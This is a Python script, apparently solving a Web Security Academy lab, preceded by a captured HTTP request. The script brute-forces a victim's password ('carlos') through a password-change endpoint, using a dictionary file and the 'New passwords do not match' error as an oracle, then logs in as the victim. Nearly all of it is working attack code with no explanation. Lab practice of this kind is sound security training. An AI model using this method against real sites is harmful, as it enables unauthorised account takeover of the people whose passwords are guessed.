'''
POST /my-account/change-password HTTP/2
Host: 0a2f0098030feee9808ba30d006b00e7.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: https://0a2f0098030feee9808ba30d006b00e7.web-security-academy.net
Connection: keep-alive
Referer: https://0a2f0098030feee9808ba30d006b00e7.web-security-academy.net/my-account?id=wiener
Cookie: session=FAjpVIfNDmW5EBgbxTaDFyLQiN3WNFuF
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
TE: trailers

username=wiener&current-password=peter&new-password-1=peter&new-password-2=peter
'''

import requests

DOMAIN = "0a2f0098030feee9808ba30d006b00e7.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/my-account?id=wiener",
    "Cookie": "session=FAjpVIfNDmW5EBgbxTaDFyLQiN3WNFuF",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

with open("../passwords.dic", "r") as file:
    PASSWORD_DIC = file.readlines()

def change_password(username, current_password, new_password_1, new_password_2):
    url = f"https://{DOMAIN}/my-account/change-password"
    data = {
        "username": username,
        "current-password": current_password,
        "new-password-1": new_password_1,
        "new-password-2": new_password_2
    }

    response = requests.post(url, headers=HEADERS, data=data)
    if "Password changed successfully!" in response.text:
        print(f"Password changed to {new_password_1}")

    if "New passwords do not match" in response.text:
        print(f"New passwords do not match")
        return current_password
    
def brute_force_password_change(username="carlos", new_password="peter"):
    for password in PASSWORD_DIC:
        password = password.strip()
        print(f"Trying password: {password}")
        current_password = change_password(username, password, new_password, new_password + "1")
        if current_password:
            print(f"Posible password: {current_password}")
            return

def login(username, password):
    url = f"https://{DOMAIN}/login"
    data = {
        "username": username,
        "password": password
    }

    response = requests.post(url, headers=HEADERS, data=data)

    if "Please try again in 1 minute(s)." in response.text:
        print("Rate limited")
        return
    
    if "Your username is:" in response.text:
        HEADERS["Cookie"] = response.request.headers["Cookie"]
        print(HEADERS["Cookie"])      
        print(f"Logged in as {username}")


login("wiener", "peter")
# brute_force_password_change("carlos", "peter")
login("carlos", "1234")